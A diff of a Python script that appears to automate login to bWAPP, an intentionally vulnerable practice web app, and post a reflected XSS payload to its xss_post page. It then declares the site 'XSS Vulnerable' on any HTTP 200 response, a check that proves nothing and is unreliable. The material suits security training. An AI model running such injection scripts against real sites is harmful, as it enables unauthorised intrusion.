@@ -1,12 +1,16 @@
 import requests
+import codecs
+from bs4 import BeautifulSoup
+
 
 #------------------------------------#
 #info to create a new users
 login = "bee"
 password = "bug"
 email = "beez@site.com"
+security_level = 2
 secret = "My secret is sooo sicr3t"
-url_base = "http://192.168.3.167"
+url_base = "http://172.20.9.208"
 
 #add a session to the request
 s = requests.session()
@@ -36,25 +40,14 @@ url_login = url_base + "/bWAPP/login.php"
 payload = {
 			"login": login,
 			"password": password,
+			"security_level": security_level,
 			"form": "submit"
 			}
 #send a requets to login the user with passed info
 loginUserResponse = s.post(url_login, data=payload, headers= headers)
 #login the user
-loginUserResponse.content
+loginUserResponse
 
-#------------------------------------#
-#go to bugs page to select one
-url_bugs = url_base + "/bWAPP/portal.php"
-#select one bug using it's value
-payload = {
-			"bug": 49,
-			"form": "submit"
-			}
-#send a request to select the passed bug value
-selectBugResponse = s.post(url_bugs, data=payload, headers= headers)
-#select the bug
-selectBugResponse.content
 
 #------------------------------------#
 #go to one xss bug page
@@ -63,10 +56,21 @@ url_bugs = url_base + "/bWAPP/xss_post.php"
 payload = {
 			"firstname":	'<script>alert("Oh!");</script>',
 			"form":	"submit",
-			"lastname":	'<script>alert("Oh!");</script>'
+			"lastname":	''
 			}
 #send a request to inject the passed values including script injection
 bugPageResponse = s.post(url_bugs, data=payload, headers= headers)
 #get response of the injection
-print(bugPageResponse.text)
 
+if bugPageResponse.status_code == 200:
+	print("XSS Vulnerable")
+else:
+	print("Not Vulnerable")
+
+
+
+html_page =codecs.open("alert.js.html", "r")
+
+parsed_html = BeautifulSoup(html_page, "html.parser")
+
+# print(parsed_html)
